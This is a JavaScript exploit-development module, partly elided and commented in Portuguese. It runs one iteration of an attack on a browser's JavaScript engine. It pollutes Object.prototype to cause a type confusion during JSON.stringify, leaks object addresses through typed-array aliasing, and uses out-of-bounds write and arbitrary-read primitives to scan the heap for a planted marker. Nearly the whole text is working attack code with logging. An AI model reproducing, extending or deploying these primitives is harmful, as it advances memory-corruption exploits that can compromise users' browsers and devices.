// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R38)
...
// ATENÇÃO: Estes endereços de scan são HIPOTÉTICOS. Aumentar a faixa pode ser necessário.
const SCAN_HEAP_START_ADDRESS_R38 = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS_R38 = new AdvancedInt64(0x0, 0x8A020000); // Mantendo faixa pequena (128KB) para teste rápido
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R38`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + Memory Scan (R38) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R38...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        memory_scan_result: { success: false, msg: "Memory scan (R38): Not run.", found_at_address: null, oob_buffer_base_addr: null },
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        logS3(`\n===== ITERATION R38: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
        ...
        const current_object_to_leak_A = { marker_A_R38: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R38: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        function toJSON_TA_Probe_Iter_Closure_R38() { 
            ...
            logS3(`[PROBE_R38] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R38"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R38",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R38",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R38] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            ...
            let lvf=NaN,lis="getter_err_r38";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R38] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
        ...
        let iter_memory_scan_result = { success: false, msg: "Memory scan (R38): Not run.", found_at_address: null, oob_buffer_base_addr: null };
        let heisenbugConfirmedThisIter = false; 
        
        try { 
            logS3(`  --- Fase 1 (R38): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            ...
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R38,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R38: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                ...
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R38: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
            ...
            logS3(`  --- Fase 1 (R38) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);
            ...
            if (heisenbugConfirmedThisIter) { 
                try {
                    ...
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R38, SCAN_MARKER_VALUE_R38, 8);
                    const verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R38, 8);
                    if (!verify_marker.equals(SCAN_MARKER_VALUE_R38)) {
                    ...
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R38.low(), SCAN_HEAP_START_ADDRESS_R38.high()); 
                         advInt64LessThanOrEqual(current_scan_addr, SCAN_HEAP_END_ADDRESS_R38); 
                         current_scan_addr = current_scan_addr.add(SCAN_STEP_R38)) {
                        if (current_scan_addr.low() % (SCAN_STEP_R38 * 20) === 0) {logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');}
                        try { 
                            const value_at_addr = await arb_read(current_scan_addr, 8); 
                            if (isAdvancedInt64Object(value_at_addr) && value_at_addr.equals(SCAN_MARKER_VALUE_R38)) {
                                ...
                                iter_memory_scan_result.oob_buffer_base_addr = found_marker_addr.sub(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R38).toString(true);
                            ...
                            if (current_scan_addr.low() % (SCAN_STEP_R38 * 50) === 0) { 
                                logS3(`  MemScan: Erro ao ler/processar ${current_scan_addr.toString(true)}: ${e_scan_read.name} - ${e_scan_read.message}`, 'warn');
                            }
                        }
                        await PAUSE_S3(0); 
                    }
                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador não encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R38.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R38.toString(true)}.`;
                } catch (e_mem_scan) {
            ...
            logS3(`  --- Fase 2 (R38) Concluída. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");
        ...
        // <<<< Lógica ATUALIZADA para best_result_for_runner (R38) >>>>
        let tc_ok_this_iter = heisenbugConfirmedThisIter;
        let scan_successful_this_iter = iter_memory_scan_result.success;
        
        // Se esta iteração teve um scan bem-sucedido, ela é a melhor.
        if (scan_successful_this_iter) {
            best_result_for_runner = { ...current_iter_summary };
        } 
        // Senão, se esta iteração teve TC e o 'best_result' atual não tem scan bem-sucedido,
        // então esta iteração é a melhor (ou a primeira a ter TC).
        ...
        // Senão, se é a última iteração e nada de bom foi encontrado ainda, pega esta.
        else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { ...current_iter_summary };
        }
        
        if(scan_successful_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R38: Scan OK!`;
        else if(tc_ok_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R38: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R38: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R38): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
